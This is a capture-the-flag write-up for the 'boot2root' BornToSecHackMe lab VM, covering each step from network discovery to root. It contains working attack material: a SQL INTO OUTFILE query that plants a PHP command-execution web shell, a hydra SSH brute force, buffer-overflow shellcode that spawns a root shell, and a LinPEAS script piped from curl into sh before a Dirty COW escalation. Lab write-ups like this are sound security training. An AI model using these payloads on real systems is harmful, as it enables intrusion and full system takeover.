# boot2root

Date de création: 24 avril 2024 17:52

### Network Discovery:

```bash
sudo arp-scan --localnet
```

192.168.142.1   00:50:56:c0:00:08       (Unknown)
192.168.142.2   00:50:56:ff:8c:8f       (Unknown)
192.168.142.132 00:0c:29:37:c4:88       (Unknown)
192.168.142.254 00:50:56:ff:ed:e8       (Unknown)

After running nmap, it was noticed that 192.168.142.132 has port 80 open.
I checked the website, it says "Hack Me" so I know that 192.168.142.132 is the correct machine.

### Machine Analysis:

```bash
nmap -A
```

21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/http Apache httpd 2.2.22
993/tcp open  ssl/imap Dovecot imapd

Nothing interesting was found on port 80, but port 443 (https) has a forum, a squirrelmail, and a phpmyadmin...

I found this out by running feroxbuster:

```bash
 feroxbuster --url [https://192.168.142.132](https://192.168.142.132/) -k (k = Disables TLS certificate validation in the client)
```

### On the forum:

<aside>
💡 On the forum, I noticed the topic "Login Problem?" by lmezard which contains a log history and a password:
Failed password forinvalid user **!q\]Ej?*5K5cy*AJ** from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)

</aside>

We found the password for Lmezard, which gives us access to his account.

In her account, we find this email address: [**laurie@borntosec.net**](mailto:laurie@borntosec.net)

### Squirrelmail:

This address allows us to log in to squirrelMail, with the same password.

And in the emails, we have a mail "DB access" which gives us the creds for the db:
"Use root/Fg-'kKXBj87E:aJ$"

### PhpMyAdmin (SQL DB):

Once on Php My Admin, things get a bit more complex. We will try a getshell method:

For that, we will use the sql query generator from phpmyadmin and use a known exploit
which consists of writing to the server via an OUTFILE: "SELECT ... INTO OUTFILE"

We will use this payload to test the injection: 

```bash
SELECT "hello" INTO OUTFILE "/var/www/forum/templates_c/test
```

Why do we use /var/www/forum/templates_c/test? Because we want to write to the site (**/var/www/**) to verify that the writing worked and in **forum/templates_c** because it's the only
place where we have write permission.

Bingo, we indeed have hello added in [https://192.168.142.132/forum/templates_c/test](https://192.168.142.132/forum/templates_c/test)

We now need to get a reverse shell, we will generate it on [revshells.com](http://revshells.com/); here it is:

```bash
select "<html> <body> <form method='GET' name='<?php echo basename($_SERVER['PHP_SELF']); ?>'> <input type='TEXT' name='cmd' id='cmd' size='80'> <input type='SUBMIT' value='Execute'> </form> <pre> <?php     if(isset($_GET['cmd']))     {         system($_GET['cmd']);     } ?> </pre> </body> <script>document.getElementById('cmd').focus();</script> </html>" into outfile "/var/www/forum/templates_c/test.php"
```

Opening test.php, we have an input, and we can write our commands in it.

### Get Laurie’s account:

We do an ls of /home and we find lookatme. If we search for lookatme we come across the file
"password" which contains 'lmezard:G!@M6f4Eatau{sF"'

We connect via ftp (because ssh doesn't work).

We find ourselves facing two files:

- A README indicating that we will find Laurie's password
- a file "fun"

The fun file is an archive, we know this thanks to the file command.
We decompress the archive then we come across a multitude of files.
By doing a cat * and reading a bit, we see a part of code, which put together gives:
printf("MY PASSWORD IS : %c%c%c%c%c%c%c%c%c%c%c%c", getme1(), getme2(), getme3()...);

We need to find the content of the getme, so I thought of doing the command grep -l "getme" ft_fun/* and I find some getme, but not others.
The files are split but they each have their file number, so for example for getme1 we have:
cat ft_fun/331ZU.pcap
char getme1() {
//file5
We just have to look for //file6 with grep -l 'file6\([^0-9]\|$\)' ft_fun/*

after a little work, here is the result: Iheartpwnage
We are then asked to convert it to sha256 which gives as password for Laurie’s account: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

### Get Thor’s account (The Bomb):

Once we are connected with "laurie" account, we can see 2 files in the home directory.

```
- bomb
- README
```

First, we used the command "file" to determine the type of the file.

```bash
laurie@BornToSecHackMe:~$ file bomb
bomb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.0.0, not stripped
```

We can see that is a 32 bits executable file, so we tried to execute the file.

```bash
laurie@BornToSecHackMe:~$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
```

We understand that we will have to find the code for 6 levels.

How to find them ?

It exists many open sources software to decompile a binary file, so we decided to use "Ghidra" (<https://github.com/NationalSecurityAgency/ghidra>) or we can use "Decompiler Explorer" online website (<https://dogbolt.org/>)

We can now try to understand how our program works.
Here is the decompiled main:

```bash
[...]
int main(int argc,char **argv)
{
initialize_bomb(argv);
printf("Welcome this is my little bomb !!!! You have 6 stages with\n");
printf("only one life good luck !! Have a nice day!\n");
uVar1 = read_line();
phase_1(uVar1);
phase_defused();
printf("Phase 1 defused. How about the next one?\n");
uVar1 = read_line();
phase_2(uVar1);
phase_defused();
printf("That\'s number 2.  Keep going!\n");
uVar1 = read_line();
phase_3(uVar1);
phase_defused();
printf("Halfway there!\n");
uVar1 = read_line();
phase_4(uVar1);
phase_defused();
printf("So you got that one.  Try this one.\n");
uVar1 = read_line();
phase_5(uVar1);
phase_defused();
printf("Good work!  On to the next...\n");
uVar1 = read_line();
phase_6(uVar1);
phase_defused();
return 0;
}
[...]
```

Our program has 6 phases, that are our 6 levels.

After trying to understand the functions, we found all the passwords.

laurie@BornToSecHackMe:~$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
0 q 777
Halfway there!
9
So you got that one.  Try this one.
opuKMA
Good work!  On to the next...
4 2 6 3 1 5
Congratulations! You've defused the bomb!

To have access to the next account, the README tell us:

```
- When you have all the password use it as "thor" user with ssh.

```

So, the password is : Publicspeakingisveryeasy.126241207200q7779opuKMA426315

We tried this password, but, it's wrong.
After looking at the subject, we saw that we have to invert 3 and 1 for the last password.

So the password should be: Publicspeakingisveryeasy.126241207200q7779opuKMA426135
But its still wrong.

In the bomb program, many passwords worked for the same level, so we created a wordlist with all possibilities ~100.

Once the wordlist ready, we used "hydra" to bruteforce the ssh.

```bash
hydra -l thor -P word -s 22 192.168.56.6 ssh
```

After few seconds, we found the real password:

[22][ssh] host: 192.168.56.6   login: thor   password: Publicspeakingisveryeasy.126241207201b2149opekmq426135

### Get Zaz’s account (The Turtle):

`turtle` is an ASCII text file containing a series of instructions:

```
┌──(fab㉿kali)-[~]
└─$ file turtle
turtle: ASCII text

┌──(fab㉿kali)-[~]
└─$ cat turtle
Tourne gauche de 90 degrees
Avance 50 spaces
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
<SNIP>

**Can you digest the message? :)**
thor@BornToSecHackMe:~$
```

Turtle is also the name of a python library that allows you to draw shapes. If we format the instructions of turtle ****in a way that the Turtle library understands, we got something like that:

```bash
import turtle

t = turtle.Turtle()
t.left(90)
t.forward(50)
t.forward(1)
t.left(1)
t.forward(1)
t.left(1)
t.forward(1)
t.left(1)
t.forward(1)
t.left(1)
<SNIP>
```

Finally, if you write it on a website like [https://pythonsandbox.com/turtle](https://pythonsandbox.com/turtle), we can read the message “SLASH”. But it was not the password. 

After having tried to hash the word “SLASH”  with `sha1sum` and `sha256sum`, we tried `md5sum` and got it:

```
┌──(fab㉿kali)-[~]
└─$ echo -n SLASH > slash.txt

┌──(fab㉿kali)-[~]
└─$ md5sum slash.txt
646da671ca01bb5d84dbb5fb2238dc8e  slash.txt

┌──(fab㉿kali)-[~]
└─$
```

So we have:

```
zaz:646da671ca01bb5d84dbb5fb2238dc8e
```

and we can `su zaz`:

```
thor@BornToSecHackMe:~$ su zaz
Password:
zaz@BornToSecHackMe:~$
```

**Get root account(buffer overflow):**

Once we are connected on "zaz" account, we can see an executable file and a folder.

We searched in the mail folder but we didnt find anything interesting.

So we take a look at the executable file "exploit_me".

```bash
zaz@BornToSecHackMe:~$ file exploit_me
exploit_me: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x2457e2f88d6a21c3893bc48cb8f2584bcd39917e, not stripped
zaz@BornToSecHackMe
```

The file is an ELF 32 bits.

```bash
zaz@BornToSecHackMe:~$ ls -l
total 5
-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
drwxr-x--- 3 zaz  zaz  107 Oct  8  2015 mail
```

We can see the executable has root rights so if we run a shell inside the program, we will be root on the machine.

When we try to execute the file, nothing appear.
So we added arguments

```bash
zaz@BornToSecHackMe:~$ ./exploit_me abc
abc
```

The program print the args on the stdout.

By decompiling the file, we understand that the program copy the string into a buffer of 140 and print it to the stdout.

```bash
bool main(int param_1,int param_2)
{
char local_90 [140];
if (1 < param_1) {
	strcpy(local_90,*(char **)(param_2 + 4));
	puts(local_90);
}
return param_1 < 2;
}
```

The program doesn't check any length so if we write more than 140, the program crashes.

So we can exploit the program with a buffer overflow attack.
The goal is to write something into the memory and make it executed by the program.
We will write a code to spawn a shell with execve and /bin/sh.

First, we have to calculate the offset.

With Kali Linux, we can create a random string pattern to calculate it:

> msg-pattern_create -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
> 

Now we will run the program with GDB and the "PEDA" plugin ([https://github.com/longld/peda](https://github.com/longld/peda)).
gdb-peda will give us many interesting informations.

> gdb --args ./exploit_me Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
> 

We can see all the registers and the EIP registers that is the register we want to overwrite.

In the EIP register we can see: 6Ae7

So we run the following command to get our offset

> msf-pattern_offset -q 6Ae7
[*] Exact match at offset 140
> 

We need to pad our input with 140 characters before adding our shellcode that will be written on the memory.

Now we need to find the ESP address.
To do it, we make our program crash and we run this command:

> dmesg | tail -1
[21309.218795] exploit_me[18468]: segfault at 46b0c031 ip 46b0c031 sp bffff6b0 error 14
> 

Our address is : bffff6b0
We have now all what we need to exploit our program.

Our exploit will look like to: [OFFSET][ESP ADDRESS][NOP CODE][SHELLCODE]
(A NOP code is an instruction to increment the instruction pointer (EIP).)

To easily construct our exploit, we use perl to generate a string.

```bash
./exploit_me perl -e 'print "A"x140 . "\\xb0\\xf6\\xff\\xbf" . "\\x90"x35 .  "\\x31\\xC0\\xB0\\x46\\x31\\xDB\\x31\\xC9\\xCD\\x80\\xEB\\x16\\x5B\\x31\\xC0\\x88\\x43\\x07\\x89\\x5B\\x08\\x89\\x43\\x0C\\xB0\\x0B\\x8D\\x4B\\x08\\x8D\\x53\\x0C\\xCD\\x80\\xE8\\xE5\\xFF\\xFF\\xFF\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68"'
```

Voila, we succesfully ran a shell into our program, with root privilege.

## Alternative method:

Another method to get root on the machine is to use LinPeas. Once logged in as any user, you can find vulnerability with it.

We download LinPeas using this command:  

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

The return gives an interesting result:

<aside>
💡 OS: Linux version 3.2.0-91-generic-pae (buildd@lgw01-15) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015
…..
[+] [CVE-2016-5195] dirtycow

</aside>

LinPeas tells us that the Linux version has a critical security breach. We then have an indication of the tool to use to exploit it (dirtycow).

We download dirtycow on the machine, compile it then execute it and we have a new user “firefart” who is root on the machine.